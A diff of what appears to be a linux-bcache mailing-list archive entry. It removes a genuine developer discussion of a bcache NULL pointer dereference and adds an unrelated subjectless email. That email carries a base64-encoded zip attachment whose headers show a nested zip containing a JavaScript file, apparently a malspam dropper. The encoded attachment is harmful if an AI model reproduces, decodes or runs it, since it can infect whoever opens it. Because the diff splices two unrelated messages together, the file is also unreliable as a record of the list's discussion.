@@ -1,119 +1,68 @@
-From: Coly Li <i@coly.li>
-Subject: Re: Comm: bcache_allocato BUG: unable to handle kernel NULL pointer
- dereference at 00000000000006bc
-Date: Sun, 15 Oct 2017 18:27:23 +0800
-Message-ID: <132af933-178f-2e46-d2ee-4d48a83e3c71@coly.li>
-References: <CAGmahrSoEjp5Qh4P9OLk-x7W73F3FNbwc7x2wpChHq_Y_SSj=g@mail.gmail.com>
- <c1470bb5-413c-2cc9-0560-b90a3b577c99@coly.li>
- <CAGmahrQ=UhHOpwcRXgWqgyb6aWFt3FGn0vip630JSCq8cMH0CA@mail.gmail.com>
- <f0bd886e-b083-a07a-89c2-a8ade257aeef@coly.li>
- <2c3a76c1-3374-ac8d-5023-fd8809d399d2@lyle.org>
- <f4f81939-723a-b130-7d72-b9e4f194d604@coly.li>
- <9cfdd5d4-0956-2c51-e30e-e76fb2276ec7@lyle.org>
+From: <clasico082@gmail.com>
+Subject: (unknown)
+Date: Sun, 15 Oct 2017 18:29:15 -0000
+Message-ID: <150809215506.32756.9740020110677830430@iplannetworks.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 8bit
+Content-Type: application/zip; name="951043539.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-bcache-owner@vger.kernel.org>
-Received: from server.coly.li ([162.144.45.48]:48382 "EHLO server.coly.li"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1750722AbdJOK12 (ORCPT <rfc822;linux-bcache@vger.kernel.org>);
-        Sun, 15 Oct 2017 06:27:28 -0400
-In-Reply-To: <9cfdd5d4-0956-2c51-e30e-e76fb2276ec7@lyle.org>
-Content-Language: en-US
+Received: from customer-static-190-65.iplannetworks.net ([200.61.190.65]:4421
+        "HELO iplannetworks.net" rhost-flags-OK-FAIL-OK-FAIL)
+        by vger.kernel.org with SMTP id S1750971AbdJOS3U (ORCPT
+        <rfc822;linux-bcache@vger.kernel.org>);
+        Sun, 15 Oct 2017 14:29:20 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-bcache-owner@vger.kernel.org
 List-Id: linux-bcache@vger.kernel.org
-To: Michael Lyle <mlyle@lyle.org>
-Cc: Sverd Johnsen <sverd.johnsen@googlemail.com>, linux-bcache@vger.kernel.org
+To: linux-bcache@vger.kernel.org
 
-On 2017/10/15 上午6:34, Michael Lyle wrote:
-> On 10/14/2017 03:02 PM, Coly Li wrote:
-> [snip]
-> 
-> Hey Coly,--
-> 
-> My bad: I misread the trace and your commit log.  This makes more sense.
-> 
-> Does this re-ordering also prevent the other alloc_thread issue from
-> being triggered?
-> 
-
-So far my answer is not yet. Because I don't have exact idea that
-creating sysfs late may prevent such NULL dereference issue. This is a
-draft patch for try, there might be some other reason I didn't cache yet.
-
-For wake up allocator thread, if the thread pointer is not initialized,
-ignore it and wake up for next time is safe. But this NULL dereference
-happens in bucket allocation code patch, simply ignore it or return an
-error may cause bcache fails to start.
-
-
-> I feel like we should maybe be holding a big lock that excludes sysfs
-> actions during these critical times-- maybe make the register_lock
-> bigger-- so that it is not as critical to handle these dependencies.  It
-> will be a little less responsive/concurrent during registration but this
-> is just a boot-time or shutdown issue, so...
-
-Copied, I keep in mind for this suggestion, need to look close for the
-code dependence. I will update status late.
-
-Thanks.
-
-Coly Li
-
->> Hi Mike,
->>
->> I check the code, creating sysfs obj has no obvious logic change in the
->> code. And I ran a test for this change, just echo 1 into stop files and
->> re-register cache/cached devices by bash script.
->>
->> The dmesg output displays,
->> [ 5646.739946] bcache: bch_journal_replay() journal replay done, 3406
->> keys in 8 entries, seq 15762
->> [ 5646.740120] bcache: register_cache() registered cache device nvme1n1p1
->> [ 5647.074204] bcache: register_bdev() registered backing device md0
->> [ 5647.145510] bcache: bch_cached_dev_attach() Caching md0 as bcache0 on
->> set 76abb9d9-aea3-4e1a-9b4a-46a217963834
->> [ 5664.285232] bcache: bcache_device_free() bcache0 stopped
->> [ 5664.322575] bcache: cache_set_free() Cache set
->> 76abb9d9-aea3-4e1a-9b4a-46a217963834 unregistered
->> [ 5674.928248] bcache: bch_journal_replay() journal replay done, 4063
->> keys in 11 entries, seq 15859
->> [ 5674.928413] bcache: register_cache() registered cache device nvme1n1p1
->> [ 5675.257664] bcache: register_bdev() registered backing device md0
->> [ 5675.347494] bcache: bch_cached_dev_attach() Caching md0 as bcache0 on
->> set 76abb9d9-aea3-4e1a-9b4a-46a217963834
->> [ 5692.665452] bcache: bcache_device_free() bcache0 stopped
->>
->> I ran the test for a while, it seems nothing broken. Then I post out
->> this draft version.
->>
->>> Isn't this reported issue is the thing that you fixed earlier in
->>> "bcache: check ca->alloc_thread initialized before wake up it" ?
->>>
->>
->> They are different NULL dereference locations, my previous fix is a NULL
->> dereference when waking up allocator thread, this one is a NULL
->> dereference on data bucket spinlock.
->>
->> This NULL spinlock is a little bit complex, I don't find a proper way to
->> handle caller's logic where data bucket spinlock is referenced, so I
->> change the function calling order to make sure it has been initialized
->> before any further reference.
->>
->>> It seems like we have a lot of issues with bringing up devices and
->>> tearing them down/detaching.
->>
->> Yes, if you look at Liang Chen's patch "bcache: explicitly destroy mutex
->> while exiting", you may find he moves sysfs_create_files(bcache_kobj,
->> files)) after bch_request_init() for the similar reason.
->>
-> 
-> --
-> To unsubscribe from this list: send the line "unsubscribe linux-bcache" in
-> the body of a message to majordomo@vger.kernel.org
-> More majordomo info at  http://vger.kernel.org/majordomo-info.html
-> 
-
-
--- 
-Coly Li
+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
